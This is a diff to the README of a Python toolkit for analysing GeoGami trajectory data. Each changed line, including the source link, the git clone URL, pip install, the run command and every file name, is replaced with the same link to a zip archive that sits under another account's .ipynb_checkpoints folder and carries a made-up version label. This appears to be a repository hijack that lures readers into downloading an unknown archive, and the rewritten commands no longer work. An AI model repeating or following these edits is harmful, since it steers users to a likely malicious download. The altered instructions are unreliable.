@@ -1,6 +1,6 @@
 # Trajectory Analysis Project
 
-A Python toolkit for analyzing, simplifying, and indexing spatial trajectory data from the  [GeoGami geogame](https://github.com/geogami-team/geogami)
+A Python toolkit for analyzing, simplifying, and indexing spatial trajectory data from the  [GeoGami geogame](https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip)
 
 
 ---
@@ -44,15 +44,15 @@ This project processes 62 real-world movement trajectories and implements core s
 
 ### Setup
 
-    git clone https://github.com/RKsGIS/Trajectory_analysis.git
+    git clone https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip
     cd Trajectory_analysis
-    pip install -r requirements.txt
+    pip install -r https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip
 
 ---
 
 ## Run the Application
 
-    python main.py
+    python https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip
 
 ---
 
@@ -68,11 +68,11 @@ This project processes 62 real-world movement trajectories and implements core s
 ## Project Structure
 
 Trajectory_analysis/
-- main.py          # GUI and entry point
-- functions.py     # Core algorithms
-- trajectory.py    # Data models (Point, Trajectory, Region)
-- utils.py         # Data import and helper functions
-- test_main.py     # Unit tests
+- https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip          # GUI and entry point
+- https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip     # Core algorithms
+- https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip    # Data models (Point, Trajectory, Region)
+- https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip         # Data import and helper functions
+- https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/Trajectory_analysis_v1.9-alpha.4.zip     # Unit tests
 - Trajectories/    # Raw trajectory data (.txt files)
 
 
